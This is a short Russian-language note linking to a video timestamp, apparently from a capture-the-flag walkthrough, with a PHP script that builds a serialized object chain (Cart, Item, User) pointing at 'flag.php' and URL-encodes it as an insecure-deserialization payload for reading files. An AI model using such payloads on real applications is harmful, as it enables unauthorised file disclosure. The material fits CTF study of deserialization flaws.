На видео: [2:53:38](https://vk.com/video-114366489_456239197?t=2h53m38s)

Собрать читалку файлов на unserialize

```php
<?php

include './index.php';

$cart = new Cart('lolkek');
$item = new Item('flag.php',150);
$cart->addItem($item);
$user = new User("asdasdsad", "sadasdas", "adfsdafsd", "asdsada", $cart);
unserialize(serialize($user));

echo urlencode(serialize($user));
```
